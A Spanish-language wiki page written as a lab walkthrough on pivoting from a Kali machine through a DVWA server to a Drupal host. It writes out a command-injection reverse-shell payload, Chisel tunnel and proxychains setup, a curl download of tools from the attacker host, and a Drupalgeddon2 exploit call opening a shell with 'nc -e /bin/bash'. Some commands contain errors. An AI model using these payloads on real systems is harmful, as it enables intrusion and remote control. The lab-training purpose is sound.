---
title: Practica de pivotaje
description: En está pagina vamos a explicar como se hizo el pivotaje
published: true
date: 2024-12-29T21:18:40.118Z
tags: 
editor: markdown
dateCreated: 2024-12-20T19:29:42.236Z
---

# Práctica pivotaje
Bienvenido a la práctica de la máquina del pivotaje.
## Explicación
La práctica que vamos consiste en un pivotaje entre maquinas vulneradas.

### Requisitos
Debemos tener tres maquinas virtuales:
1. Máquina Kali o máquina Hacker, desde donde querremos infiltrarnos.
2. Servidor 1: Servidor DVWA en un Ubuntu Server.
3. Servidor 2: Servidor Devion7 en un Oracle.

Además deberemos tener dos redes NATs:
1. Red Kali - Dvwa
2. Red Dvwa - Devion7

### Configuración de DVWA
>  Partimos con que ya se ha instalado las máquinas necesarias y se han establecidos los requisitos correctamente.
{.is-info}

Dentro de la máquina DVWA, deberemos acudir a la ruta "**/etc/apach2/ports.conf**", aquí deberemos escribir:
`Listen 127.0.0.1:8000`

Tras esto acudiremos a la ruta "**/etc/apache2/sites-available**" y crearemos la carpeta "001-router.conf"
```bash
mkdir 001-internal.conf
```

Dentro de esta carpeta deberemos escribir lo siguiente:
```
<VirtualHost 127.0.0.1:8000>
	ServerName internal.cyberlab.local
  DocumentRoot /var/www/internal
 </VirtualHost>
```

Tras hecho esto, podremos hacer el comando:
```
sudo a2ensite 001-internal.conf
```

Y después deberemos hacer un:
```console
systemctl reload apache2
```

Con esto habremos creado un servicio en el puerto 8000, y será visible siempre y cuando hagamos una lectura en locahost:8000, esto lo usaremos más adelante para comprobar efectivamente que se ha hecho correctamente el pivotaje.

Haremos solo haremos una carpeta en la ruta indicada:
```console
vim /var/www/internal/index.html
```

Aquí pondremos lo que querramos para verificar que se ha hecho el pivotaje, un buen ejemplo puede ser:
\<h1> HOLAAA </h1\>


## Ejecución
### Control de DVWA
Lo primero que haremos será establecer un puerto de escucha en Kali, para ello haremos un: 
```console
nc -lvnp (Puerto)
```
Tras esto, como Kali, deberemos acudir al apartado de DVWA:Command Injection. Aquí deberemos escribir lo siguiente:
```console
127.0.0.1;export RHOST="IPKALI";export RPORT=PUERTOKALI;nohup python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' &
```

Esto lo hemos sacado de las siguiente URL: https://www.revshells.com
> En caso de error, comprueba que la dificultad está en low, el host y el puerto.
{.is-info}

Tras esto habremos hecho una shell reversa la cual tenemos total acceso y control. Ahora vamos a intentar crear un tunnel de comunicación entre la Kali y el DVWA, para ello vamos a usar Chisel. Lo primero que haremos será descargarnos el software en: https://github.com/jpillora/chisel/releases

Y nos descargaremos aquel fichero que ponga Linux_amd64.gz

Una vez descargado, lo descomprimimos y lo haremos un ejecutable. Eso lo haremos con los siguientes comandos:
```console
gzip -d chisel_1.10.1_linux_amd64.gz
mv chisel_1.10.1_linux_amd64 chisel
chmod +x chisel
```

Este archivo lo deberemos subir a la máquina de DVWA, para ello deberemos crear un servicio web en Kali con el siguiente comando:
```console
python3 -m http.server
```
> Importante ejecutar este comando en la misma cartepa donde esta el chisel descargado.
{.is-info}

Y ahora en la máquina de DVWA, vamos a poner:
```console
curl http://(maquinaKali)/chisel -o chisel
```

Si hacemos esto de forma correcta, la máquina DVWA habrá descargado el fichero, podemos comprobarlo con un ls.

Perfecto, ahora vamos a modificar el Socks5. Esto es para poder establecer una conexión muchisimo mas comoda entre Kali y DVWA, para ello vamos a tener que modificar lo siguiente:
```console
nano /etc/proxychains4.conf
```
Deberemos fijarnos que en la primera zonas de texto, esté presente **strict_chain** y después al final deberemos comentar la linea **socks4 127.0.0.1 9050**, y escribiremos en su lugar **socks5 127.0.0.1 1080**.
![image.png](/imagen_hacking_pivotaje_1.png)

Luego en la herramienta de FoxyProxy, vamos a añadir una nueva entrada con lo siguiente:
![imagen_hacking_pivotaje_2.png](/imagen_hacking_pivotaje_2.png)

> No lo activamos todavia
{.is-warning}

Tras esto, tendremos listo un proxy que puede analizar todas las peticiones como si estuvieramos viendolo desde el seridor DVWA.

Lo siguiente que haremos será establecer la conexión con chisel para poder, para ello en Kali escribiremos: 
```console
./chisel server -p 4000 --reverse
```

En nuestra maquina vulnerada (DVWA), deberemos escrbir lo siguiente:
```console
./chisel client (ip kali):4000 R:8000:127.0.0.1:8000
```

Si todo va bien, desde nuestra maquina local podremos buscar el servidor local que hicimos en DVWA:
![imagen_hacking_pivotaje_3.png](/imagen_hacking_pivotaje_3.png)


Ahora vamos a usar el socks5 que configuramos anteriormente. Para ello deberemos poner en nuestra maquina local:
```console
./chisel server -p 4000 --reverse --socks5
```

Y en nuestra maquina DVWA, vamos a poner:
```console
./chisel server -p 4000 --reverse R:socks
```


Tras esto, si activamos el proxy, podremos hacer la busqueda del servidor directametne en el navegador.

### Entrar en Debian
Para poder tener acceso a este nuevo servidor, como ya tenemos una shell ocupada con la comunicaciones, vamos a abrir un nueva shell. Para ello deberemos hacer los mismos paso que hicimos anteriormente (nc -lnvp).
Una vez tengamos una nueva shell, vamos a intentar descubrir las IP locales en esta red, para ello primero hacemos:
```script
ip a
```

Y una vez sepamos el rango de la IP, en mi caso 10.0.0.6/24. Vamos a poner un pequeño script en la máquina DVWA para detectar el resto de IPs, el escript es el siguiente:
```bash
for j in $(seq 1 10);do ping -c 10.0.3.$j > /dev/null && echo "host activo 10.0.3.$j";done
```
Esto nos devolverá un listado grande de IPs por lo que deberemos deducir cuál es el server, para ello podemos hacer uso de nmpa con:
```bash
proxychains4 -q nmap -sT -Pn 10.0.3.4
```
> Ir probando la IP con cada uno de los resultados para ver los puertos disponibles.
{.is-info}

Cuando entramos en el website, podemos descrubir que es un servidor Drupal con una vulnerabilidad de Drupalgeddon2. Por lo que podemos usar el exploit (Disponible en GitHub), para poder explotarlo.

Una vez tengamos el exploit disponible vamos a realizar lo siguiente:
- En una terminal de DVWA vamos a poner:
```bash
./chisel client (kali):4000 0.0.0.0:9999:(kali):9999
```
- En una terminal de kali:
```bash
nc -lnvp 9999
```
- En otra terminal de kali, sin cerrar la anterior:
```bash
proxychains 4 -q python2 exploit.py -h http://(ip/ dc-1) -c 'nohup nc -e /bin/bash (Ip Dvwa) 9999 &'
```